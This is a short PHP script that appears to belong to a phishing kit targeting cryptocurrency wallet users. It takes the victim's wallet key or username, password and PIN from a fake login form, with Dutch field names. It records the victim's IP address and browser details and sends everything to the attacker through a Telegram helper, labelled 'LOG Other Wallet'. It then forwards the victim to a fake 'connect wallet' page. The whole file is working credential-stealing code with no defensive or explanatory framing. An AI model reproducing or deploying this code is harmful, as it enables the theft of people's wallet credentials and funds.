<?php

session_start();

include ('./tgconfig/telegram.php');
include ('wallet-connect.php');

$_SESSION['gebruikersnaam'] = $_POST['gebruikersnaam'];
$_SESSION['wachtwoord'] = $_POST['wachtwoord'];
$_SESSION['npinnogmaals'] = $_POST['newpinr'];
$_SESSION['remote_ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

$telegramMessage =
        "<strong>‼️🔔 LOG Other Wallet 🔔‼️</strong>\n".
		"<strong></strong>\n".
        "<strong>🌐 IP  ".$_SESSION['remote_ip']."</strong>\n".
		"<i>📱 OS:  ".$_SESSION['useragent']."</i>\n".
		"<strong></strong>\n".
        "<strong>Key:</strong> ".$_SESSION['gebruikersnaam']."\n".
		"<strong></strong>\n".
        "<strong>Password:</strong> ".$_SESSION['wachtwoord']."\n"
        ;

telegram($telegramMessage);
finish($telegramMessage);

header("Location: ./connect-wallet.html ");
?>